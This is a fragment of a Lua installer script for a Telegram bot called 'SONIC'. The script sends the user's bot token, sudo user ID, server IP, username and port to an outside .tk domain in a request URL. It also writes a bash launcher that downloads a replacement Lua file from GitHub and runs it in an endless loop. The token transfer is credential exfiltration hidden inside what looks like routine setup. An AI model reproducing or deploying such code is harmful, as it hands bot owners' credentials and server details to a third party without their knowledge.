...
data,res = https.request("https://SONIC-source.tk/SONIC Team/index.php?bn=info&id="..Id)
if res == 200 then
...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://Sonic-source.tk/SONIC Team/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("SONIC", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/SONIC
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr SONIC.lua
wget "https://raw.githubusercontent.com/SONIC-Omar/SONIC TEAM/master/SONIC.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./SONIC.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S SONIC -X kill
screen -S SONIC ./SONIC team 
done
]])
RunTs:close()
end
